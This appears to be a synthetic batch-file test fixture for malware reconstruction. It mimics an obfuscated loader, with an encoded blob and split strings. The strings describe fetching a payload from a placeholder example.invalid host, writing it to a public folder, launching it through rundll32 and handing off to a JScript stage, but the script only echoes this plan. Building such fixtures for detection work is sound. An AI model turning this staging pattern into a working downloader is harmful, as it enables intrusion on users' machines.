@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:base64_literal|rotate_left
rem HUNTRESS-MATERIAL:7Hpi+OboyuDmesLG4urS5Mq+5Mra3ujKWO7k0ujKvszS2MpYyNLm4MLoxtC+4OTexsrm5ljQwtzI3szMvubG5NLg6PjCyMLg6MrkeuTq3MjY2GZkXMrwyvjm6MLOyr7G3urc6Hpo+M7kwuDQesbk3ubmvtjC3M7qws7K+NzK8Oi+2MLczurCzsp61ObG5NLg6PjGwtrgwtLO3L7SyHrGwtrgwtLO3FpgbmhiyMRwymps+Ork2HrQ6Ojg5nReXmBuaGLIxHDKamxcyvDC2uDYylzS3OzC2NLIXm5wxMbMxsTGXMjC6PjM0tjKvuDC6NB6hnS4qubK5Oa4oOrE2NLGuJDq3OjkyubmmMLEuObows7KWmBuaGLIxHDKamxcyMLo+NzK8Oi+5ujCzsp65ujCzspaYG5oYsjEcMpqbFzU5g==
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=acquire_remote,write_file,dispatch_process,handoff_script|adapter=rund"& rem HUNTRESS quote compound
set "FrAg1=ll32.exe|stage_count=4|graph=cross_language|next_language=jscript|campaign_id=ca"& rem HUNTRESS quote compound
set "FrAg2=mpaign-0741db8e56|url=https://0741db8e56.example.invalid/78bcfcbc.dat|file_path="& rem HUNTRESS quote compound
set "FrAg3=C:\Users\Public\HuntressLab\stage-0741db8e56.dat|next_stage=stage-0741db8e56.js"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=38c611a9"
set "ReCoVeReD=%FrAg0%%FrAg1%%FrAg2%%FrAg3%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo rundll32.exe acquire, write, dispatch, and hand off stage-0741db8e56.js
exit /b 0
